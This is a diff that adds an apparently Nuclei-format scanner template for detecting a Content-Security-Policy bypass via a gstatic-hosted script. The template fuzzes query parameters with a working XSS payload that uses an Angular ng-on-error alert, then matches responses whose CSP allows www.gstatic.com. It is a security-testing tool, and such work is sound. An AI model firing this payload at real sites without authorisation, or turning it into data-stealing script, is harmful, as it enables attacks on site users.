@@ -1,0 +1,47 @@
+id: gstatic-csp-xss
+
+info:
+  name: Content-Security-Policy Bypass via Gstatic
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L196C17-L196C169
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,gstatic
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{injection}}"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: word
+        part: content_security_policy
+        words:
+          - "www.gstatic.com"
+          - "script-src"
+        condition: and
